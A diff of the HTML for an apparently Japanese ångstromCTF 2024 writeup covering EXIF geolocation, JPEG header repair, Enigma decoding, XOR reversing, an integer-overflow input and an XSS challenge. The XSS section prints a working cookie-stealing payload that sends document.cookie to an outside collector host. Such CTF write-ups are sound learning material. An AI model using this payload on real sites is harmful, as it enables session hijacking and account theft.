@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/angstromctf_2024/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="ångstromCTF 2024 Writeup" />
 <meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2024/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2024/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2024-06-01T13:00:00+09:00" />
 <meta property="article:modified_time" content="2024-06-01T13:00:00+09:00" />
 <meta itemprop="name" content="ångstromCTF 2024 Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50">
-<meta itemprop="datePublished" content="2024-06-01T13:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2024-06-01T13:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="2026">
-
-
-
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50"><meta itemprop="datePublished" content="2024-06-01T13:00:00+09:00" />
+<meta itemprop="dateModified" content="2024-06-01T13:00:00+09:00" />
+<meta itemprop="wordCount" content="2031">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="ångstromCTF 2024 Writeup"/>
 <meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50"/>
@@ -207,10 +203,10 @@
 <br>
 今回は、190点を獲得し、順位は437位でした。<br />
 <img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_score.png" alt="angstromctf_2024_score.png">
-<p><br /></p>
+<br />
 <p>以下は解いたチャレンジです。<br />
 <img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_solves.png" alt="angstromctf_2024_solves.png"></p>
-<p><br /></p>
+<br />
 <p>チャレンジ一覧:</p>
 <img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_chall1.png" alt="angstromctf_2024_chall1.png">
 <img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_chall2.png" alt="angstromctf_2024_chall2.png">
@@ -225,7 +221,7 @@
 <br /><br />
 For example, if the road was &ldquo;Colesville Road&rdquo; the flag would be actf{colesville}.</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>写真に写っている景色を見ても場所は特定できなさそうだったので、exifのlocationだと予想。</p>
 <pre>
@@ -241,17 +237,17 @@ GPS Position                    : 37 deg 56' 23.60" N, 75 deg 26' 17.11" W
 Hyperfocal Distance             : 3.04 m
 Light Value                     : 3.4
 </pre>
-<p><br />
-以下のフォーマットでGoogleでサーチしてもダメだったので、</p>
+<br />
+以下のフォーマットでGoogleでサーチしてもダメだったので、
 <pre>
 37 deg 56' 23.60" N, 75 deg 26' 17.11" W
 </pre>
-<p><br />
-以下のように変更してからGoogleでサーチ。</p>
+<br />
+以下のように変更してからGoogleでサーチ。
 <pre>
 37°56'23.60"N, 75°26'17.11"W
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{chincoteague}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -261,7 +257,7 @@ Light Value                     : 3.4
 <blockquote>
 <p>Anna: Do you wanna build a snowman? Elsa: Sure if you can open my snowman picture (snowman.jpg)</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>ヘッダ修復系だと思いつつ、「ヘッダ合っているしなぁ」と思って、大会中に解けなかったやつです。</p>
 <p>JPGのヘッダは、&ldquo;ffd8 ffe0&quot;が正解でしたね。</p>
@@ -272,7 +268,7 @@ $ xxd snowman.jpg | head
 (snip)
 :
 </pre>
-<p><br /></p>
+<br />
 <p>手元にあった別のjpgとも比較してたんですが。。。（メモより）</p>
 <pre>
 $ xxd ~/Pictures/IMG-20230420-WA0049.jpg | head
@@ -281,14 +277,14 @@ $ xxd ~/Pictures/IMG-20230420-WA0049.jpg | head
 (snip)
 :
 </pre>
-<p><br /></p>
+<br />
 <p>目医者に行ってきます〜（笑）</p>
-<p><br /></p>
+<br />
 <p>以下で書き換えできます。</p>
 <pre>
 printf '\xff' | dd of=snowman.jpg bs=1 seek=0 count=1 conv=notrunc
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{built_the_snowman}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -299,11 +295,11 @@ printf '\xff' | dd of=snowman.jpg bs=1 seek=0 count=1 conv=notrunc
 <p>In the dimly lit, smoke-filled war room, the Enigma M3 machine sat at the center of the table like a cryptographic sentinel. Its reflector, UKW B, gleamed ominously in the low light. The three rotors, I, II, and III, stood proudly in their respective slots, each at position 1 with their rings set to 1. The plugboard, conspicuously vacant, indicated a reliance on the rotor settings alone to encode the day&rsquo;s crucial messages. As the operator&rsquo;s fingers hovered over the keys, the silence was heavy with anticipation. Each clack of the keys transformed plaintext into an unbreakable cipher, the resulting ciphertext, brht{d_imhw_cexhrmwyy_lbvkvqcf_ldcz}, a guardian of wartime secrets.
 <br /><br /></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>いろいろエニグマの設定情報が書かれていますが、CyberChefのデフォルト設定で解けます。</p>
 <p><img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_enigma.png" alt="angstromctf_2024_enigma.png"><br></p>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{i_love_enigmatic_machines_mwah}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -317,11 +313,11 @@ printf '\xff' | dd of=snowman.jpg bs=1 seek=0 count=1 conv=notrunc
 <ul>
 <li>guess_the_flag (ELF 64bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>タイトルからして、テキトーにGuessしたらフラグがわかるのかな？と思ったんですが、普通にGhidraでReverse Engineeringする必要がある気がします。</p>
-<p><br />
-Ghidraで見たら、secretcode にある文字列を 1 で XOR しているのがわかります。</p>
+<br />
+Ghidraで見たら、secretcode にある文字列を 1 で XOR しているのがわかります。
 <p>いろんな解き方があると思いますが、gdbでstrcmp()のところにbreak pointをしかけて、あとはCyberChefのXORを使って解きました。</p>
 <pre>
 strcmp@plt (
@@ -332,7 +328,7 @@ strcmp@plt (
    $r8 = 0x000000000000003e
 )
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{committed_to_the_least_significant_bit}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -348,13 +344,13 @@ nc challs.actf.co 31322</p>
 <ul>
 <li>exam (ELF 64bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <p>Pwnカテゴリですが、どっちかっていうと、Revカテゴリのチャレンジな気がします。</p>
 <p>Ghidraでソースを確認します。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -409,63 +405,63 @@ nc challs.actf.co 31322</p>
 </span><span class="lnt">53
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
-  <span class="n">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
-  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">local_e8</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-  <span class="kt">char</span> <span class="n">local_a8</span> <span class="p">[</span><span class="mi">152</span><span class="p">];</span>
-  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
-  
-  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
-  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;How much should I not trust you? &gt;:)</span><span class="se">\n</span><span class="s">: &#34;</span><span class="p">);</span>
-<span class="hl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020e0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">detrust</span><span class="p">);</span>
-</span>  <span class="n">fgets</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">detrust</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Don</span><span class="se">\&#39;</span><span class="s">t try to trick me into trusting you &gt;:(&#34;</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="k">else</span> <span class="p">{</span>
-<span class="hl">    <span class="n">trust_level</span> <span class="o">=</span> <span class="n">trust_level</span> <span class="o">-</span> <span class="n">detrust</span><span class="p">;</span>
-</span><span class="hl">    <span class="k">if</span> <span class="p">(</span><span class="n">trust_level</span> <span class="o">==</span> <span class="mh">0x7ffffffe</span><span class="p">)</span> <span class="p">{</span>
-</span>      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What kind of cheating are you doing?&#34;</span><span class="p">);</span>
-      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You haven</span><span class="se">\&#39;</span><span class="s">t even signed your statement yet!&#34;</span><span class="p">);</span>
-      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You are BANNED from all future AP exams!!!&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="p">{</span>
-<span class="hl">      <span class="k">while</span> <span class="p">(</span><span class="n">trust_level</span> <span class="o">&lt;</span> <span class="mh">0x7ffffffe</span><span class="p">)</span> <span class="p">{</span>
-</span>        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">I don</span><span class="se">\&#39;</span><span class="s">t trust you enough &gt;:)&#34;</span><span class="p">);</span>
-        <span class="n">printf</span><span class="p">(</span>
-              <span class="s">&#34;Prove your trustworthyness by reciting the statement on the front cover of the Sectio n I booklet &gt;:)</span><span class="se">\n</span><span class="s">: &#34;</span>
-              <span class="p">);</span>
-        <span class="n">fgets</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
-<span class="hl">        <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span>
-</span><span class="hl">                       <span class="s">&#34;I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/20 24. I will not disclose any information about any section of this exam.</span><span class="se">\n</span><span class="s">&#34;</span>
-</span>                      <span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-<span class="hl">          <span class="n">trust_level</span> <span class="o">=</span> <span class="n">trust_level</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span>        <span class="p">}</span>
-      <span class="p">}</span>
-      <span class="n">__stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
-      <span class="n">fgets</span><span class="p">(</span><span class="n">local_e8</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
-      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">You will now take the multiple-choice portion of the exam.&#34;</span><span class="p">);</span>
-      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You should have in front of you the multiple-choice booklet and your answer sheet. &#34;</span><span class="p">);</span>
-      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You will have %s minutes for this section. Open your Section I booklet and begin.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
-             <span class="n">local_e8</span><span class="p">);</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
-                    <span class="cm">/* WARNING: Subroutine does not return */</span>
-    <span class="n">__stack_chk_fail</span><span class="p">();</span>
-  <span class="p">}</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_e8</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_a8</span> <span class="p">[</span><span class="mi">152</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;How much should I not trust you? &gt;:)</span><span class="se">\n</span><span class="s">: &#34;</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020e0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">detrust</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">detrust</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Don</span><span class="se">\&#39;</span><span class="s">t try to trick me into trusting you &gt;:(&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line hl"><span class="cl">    <span class="n">trust_level</span> <span class="o">=</span> <span class="n">trust_level</span> <span class="o">-</span> <span class="n">detrust</span><span class="p">;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">trust_level</span> <span class="o">==</span> <span class="mh">0x7ffffffe</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What kind of cheating are you doing?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You haven</span><span class="se">\&#39;</span><span class="s">t even signed your statement yet!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You are BANNED from all future AP exams!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line hl"><span class="cl">      <span class="k">while</span> <span class="p">(</span><span class="n">trust_level</span> <span class="o">&lt;</span> <span class="mh">0x7ffffffe</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">I don</span><span class="se">\&#39;</span><span class="s">t trust you enough &gt;:)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">              <span class="s">&#34;Prove your trustworthyness by reciting the statement on the front cover of the Sectio n I booklet &gt;:)</span><span class="se">\n</span><span class="s">: &#34;</span>
+</span></span><span class="line"><span class="cl">              <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fgets</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">        <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span>
+</span></span><span class="line hl"><span class="cl">                       <span class="s">&#34;I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/20 24. I will not disclose any information about any section of this exam.</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                      <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line hl"><span class="cl">          <span class="n">trust_level</span> <span class="o">=</span> <span class="n">trust_level</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">fgets</span><span class="p">(</span><span class="n">local_e8</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">You will now take the multiple-choice portion of the exam.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You should have in front of you the multiple-choice booklet and your answer sheet. &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You will have %s minutes for this section. Open your Section I booklet and begin.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">             <span class="n">local_e8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><br />
-<code>trust_level</code>はglobal変数で0初期化されています。</p>
+<br />
+`trust_level`はglobal変数で0初期化されています。
 <p><code>trust_level</code>から、scanf()で取得する入力値<code>detrust</code>の値を引いた値が条件に当てはまるようにします。</p>
 <p>私は、2147483647 を使いました。</p>
 <pre>
@@ -473,12 +469,12 @@ $ python3
 >>> 0x7fffffff
 2147483647
 </pre>
-<p><br />
-あとは、strcmp()をしているところを2回通過し <code>trust_level</code> の値がしきい値を超えると、while() ループを抜けてフラグが表示されます。</p>
-<p><br />
-余談ですが、Ghidraのソースコードをコピペした際に、<code>5/27/20 24</code>のように余分なスペースが入ってしまっていたので、strcmp()で全然マッチせず小一時間悩みました。。。</p>
-<p><br />
-以下が実行結果です。</p>
+<br />
+あとは、strcmp()をしているところを2回通過し `trust_level` の値がしきい値を超えると、while() ループを抜けてフラグが表示されます。
+<br />
+余談ですが、Ghidraのソースコードをコピペした際に、`5/27/20 24`のように余分なスペースが入ってしまっていたので、strcmp()で全然マッチせず小一時間悩みました。。。
+<br />
+以下が実行結果です。
 <pre>
 $ nc challs.actf.co 31322
 How much should I not trust you? >:)
@@ -496,7 +492,7 @@ You will now take the multiple-choice portion of the exam.
 You should have in front of you the multiple-choice booklet and your answer sheet.
 You will have actf{manifesting_those_fives} minutes for this section. Open your Section I booklet and begin.
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{manifesting_those_fives}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -514,7 +510,7 @@ Send them a link: <a href="https://admin-bot.actf.co/markdown">https://admin-bot
 <ul>
 <li>index.js</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <p>以下の手順で解きました。</p>
 <ol>
@@ -528,12 +524,12 @@ Send them a link: <a href="https://admin-bot.actf.co/markdown">https://admin-bot
 <p>そのCookieを使って、https://markdown.web.actf.co/flag にアクセスする。</p>
 </li>
 </ol>
-<p><br /></p>
+<br />
 <p>使ったコードは以下です。</p>
 <pre>
 &lt;img src=x onerror="(new Image).src='https://captureamerica.free.beeceptor.com/cool.jpg?'+document.cookie">
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{b534186fa8b28780b1fcd1e95e2a2e2c}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -589,7 +585,7 @@ Send them a link: <a href="https://admin-bot.actf.co/markdown">https://admin-bot
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -624,20 +620,21 @@ Send them a link: <a href="https://admin-bot.actf.co/markdown">https://admin-bot
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
